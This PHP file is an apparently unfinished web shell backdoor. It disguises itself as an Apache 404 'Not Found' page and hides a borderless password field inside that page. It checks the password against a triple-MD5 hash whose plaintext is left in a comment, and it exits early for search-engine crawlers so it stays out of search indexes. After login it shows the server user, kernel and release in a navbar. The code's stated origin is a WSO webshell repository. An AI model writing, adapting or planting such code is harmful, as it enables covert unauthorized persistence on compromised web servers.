<?php
	
	// ---- VARIABLES ----

	$passphrase = "136c757bdd877848762c248e58252935"; // cosasdepuma

	$robots = array(
		'Baiduspider',
		'Bing',
		'DuckDuck',
		'Google',
		'ia_archiver',
		'MSNBot',
		'Rambler',
		'Slurp',
		'Sogou',
		'Yandex'
	);

	// ---- TEMPLATES ----

		// - Apache -

	function ApacheNotFound()
	{
		ApacheNotFound_Head();
		ApacheNotFound_Body();
		exit(0);
	}

	function ApacheNotFound_Head()
	{
?>		
<head>
	<style>
		div {
			position: absolute;
			top: 50%;
			left: 50%;
			margin-top: -25px;
			margin-left: -50px;
		}

		div form input {
			margin: 0;
			border: 0;
			background-color: #FFF;
		}
	</style>
</head>
<?php
	}

	function ApacheNotFound_Body()
	{
?>		
<body>
	<h1>Not Found</h1>
	<p>The request URL <?=dirname($_SERVER['REQUEST_URI'])?> was not found on this server.</p>
	<hr>
	<address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>


	<div>
		<form method="POST">
			<input type="password" name="passwd">
		</form>
	</div>
</body>
<?php
	}

		// - Shell -

	function Shell()
	{
		ShellHead();
		ShellNavbar();
	}

	function ShellHead()
	{
?>
<head>
	<style>
		* {
		margin: 0;
		padding: 0;
		outline: 0;
		box-sizing: border-box;
		}

		body {
			height: 100vh;
			background-color: #ddd;
		}

		/* BEGIN - NAVBAR */

		div nav {
			position: relative;
			background: #333;
			width: calc(100% - 60px);
			margin: 0 auto;
			padding: 10px 20px 10px 20px;
			text-align: right;
		}

		div nav:before {
			position: absolute;
			content: '';
			border-top: 10px solid #333;
			border-right: 10px solid #333;
			border-left: 10px solid transparent;
			border-bottom: 10px solid transparent;
			top: 100%;
			left: 0;
		}

		div nav:after {
			position: absolute;
			content: '';
			border-top: 10px solid #333;
			border-right: 10px solid transparent;
			border-left: 10px solid #333;
			border-bottom: 10px solid transparent;
			top: 100%;
			right: 0;
		}

		div nav div {
			width: 20%;
			float: left;
			color: #fff;
			font-size: 25px;
			text-align: left;
			padding-left: 2%;
		}

		div nav ul {
			margin-right: 1%;
		}

		div nav ul li {
			list-style: none;
			display: inline-block;
			color: #fff;
			letter-spacing: 1px;
			padding: 0 25px;
			font-size: 14px;
			line-height: 30px;
			position: relative;
			text-transform: uppercase;
			background: tomato;
		}

		.exit {
			padding: 0 7px;
			background: grey;
			
		}

		.exit:hover {
			background: orange;
		}

		.exit a {
			text-decoration: none;
		}

		/* END - NAVBAR */
	</style>
</head>
<?php
	}

	function ShellNavbar()
	{
?>
<div style="padding-top: 25px;">
<nav>
		<div>SecurityNotFound</div>
		<ul>
			<li><?=$GLOBALS['INFO']['USER']?></li>
			<li><?=$GLOBALS['INFO']['KERNEL']?></li>
			<li><?=$GLOBALS['INFO']['RELEASE']?></li>
			<a href="?exit"><li class="exit">⛔</li></a>
		</ul>
	</nav>
</div>
<?php
	}

	// ---- FUNCTIONS ----
	
	function SetHeaders()
	{
		header('HTTP/1.0 404 Not Found');
		header('X-Powered-By: Unicorns and kitties <3');
	}

	function FightRobots()
	{
		global $robots;
		foreach($robots as $robot)
		{
			if(strpos($_SERVER['HTTP_USER_AGENT'], $robot) !== false)
			{
				exit(0);
			}
		}
	}

	function GatherInformation()
	{
		$info = array(
			'USER'	  => @get_current_user(),
			'KERNEL'  => substr(@php_uname('s'), 0, 20),
			'RELEASE' => substr(@php_uname('r'), 0, 20)
		);
		$GLOBALS['INFO'] = $info;
	}

	function ReloadPage()
	{
		header("Location: " . explode("?", $_SERVER[REQUEST_URI])[0], true, 302);
	}

	function CheckPasswd()
	{
		global $passphrase;
		if(empty($passphrase) || (isset($_POST['passwd']) && (md5(md5(md5($_POST['passwd']))) == $passphrase)))
		{
			$_SESSION[md5($_SERVER['REMOTE_ADDR'])] = true;
			ReloadPage();
		}
		else
		{
			ApacheNotFound();
		}
	}

	function ClearSession()
	{
		unset($_SESSION[md5($_SERVER['REMOTE_ADDR'])]);
		session_destroy();
		ReloadPage();
	}

	// ---- ENTRYPOINT ----

	function Main()
	{
		session_start();
	
		SetHeaders();
		FightRobots();

		if(isset($_GET['exit']))
		{
			ClearSession();
		}
		else if(isset($_SESSION[md5($_SERVER['REMOTE_ADDR'])]))
		{
			GatherInformation();
			Shell();
		}
		else
		{
			CheckPasswd();
		}
	}
	Main();

	// https://github.com/mIcHyAmRaNe/wso-webshell
?>
